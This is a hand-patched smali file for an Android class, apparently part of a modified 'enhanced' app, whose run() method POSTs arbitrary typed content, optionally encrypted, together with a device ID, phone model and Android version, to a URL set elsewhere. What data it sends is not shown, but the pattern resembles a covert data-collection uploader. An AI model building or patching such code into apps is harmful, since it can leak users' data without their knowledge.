.class Lcom/smilex/enhanced/modules/NetworkModule$1;
.super Ljava/lang/Object;
.source "NetworkModule.java"
.implements Ljava/lang/Runnable;

.field final synthetic val$type:Ljava/lang/String;
.field final synthetic val$content:Ljava/lang/String;

.method constructor <init>(Ljava/lang/String;Ljava/lang/String;)V
    .registers 3
    iput-object p1, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$type:Ljava/lang/String;
    iput-object p2, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$content:Ljava/lang/String;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    # FIX: Increased register count to accommodate context + key + device_id variables
    .registers 14
    :try_start
    new-instance v0, Ljava/net/URL;
    invoke-static {}, Lcom/smilex/enhanced/modules/NetworkModule;->access$000()Ljava/lang/String;
    move-result-object v1
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;
    const-string v1, "POST"
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    const-string v1, "Content-Type"
    const-string v2, "application/json"
    invoke-virtual {v0, v1, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    const-string v1, "User-Agent"
    const-string v2, "Dalvik/2.1.0"
    invoke-virtual {v0, v1, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    const/16 v1, 0x3a98
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    const/16 v1, 0x7530
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    # FIX: Get application context via the new accessor method
    invoke-static {}, Lcom/smilex/enhanced/modules/NetworkModule;->access$001()Landroid/content/Context;
    move-result-object v8

    # FIX: Get device_id using correct 1-arg signature generateDeviceId(Context)
    invoke-static {v8}, Lcom/smilex/enhanced/utils/CryptoUtils;->generateDeviceId(Landroid/content/Context;)Ljava/lang/String;
    move-result-object v9

    iget-object v1, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$content:Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->length()I
    move-result v1
    const v2, 0x186a0
    if-gt v1, v2, :encrypt_payload

    iget-object v1, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$content:Ljava/lang/String;
    # FIX: Get encryption key using correct 1-arg signature getOrCreateKey(Context)
    invoke-static {v8}, Lcom/smilex/enhanced/utils/CryptoUtils;->getOrCreateKey(Landroid/content/Context;)Ljava/lang/String;
    move-result-object v10
    # FIX: Call encrypt with correct 2-arg signature encrypt(String data, String key)
    invoke-static {v1, v10}, Lcom/smilex/enhanced/utils/CryptoUtils;->encrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    const-string v4, "1"
    goto :build_json

    :encrypt_payload
    iget-object v1, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$content:Ljava/lang/String;
    const-string v4, "0"

    :build_json
    # FIX: Corrected JSON structure — device_id first, then type, data, enc, model, android_version
    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
    const-string v5, "{\"device_id\":\""
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    # Append device_id (v9 computed above)
    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v5, "\",\"type\":\""
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    # Append the data type (val$type)
    iget-object v5, p0, Lcom/smilex/enhanced/modules/NetworkModule$1;->val$type:Ljava/lang/String;
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v5, "\",\"data\":\""
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v5, "\",\"enc\":\""
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v5, "\",\"model\":\""
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    sget-object v5, Landroid/os/Build;->MODEL:Ljava/lang/String;
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v5, "\",\"android_version\":\""
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    sget-object v5, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v5, "\"}"
    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3

    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    const-string v5, "UTF-8"
    invoke-virtual {v3, v5}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v3
    invoke-virtual {v2, v3}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    return-void
    :error
    move-exception v0
    const-string v1, "NetworkModule"
    const-string v2, "Upload failed"
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    return-void
.end method
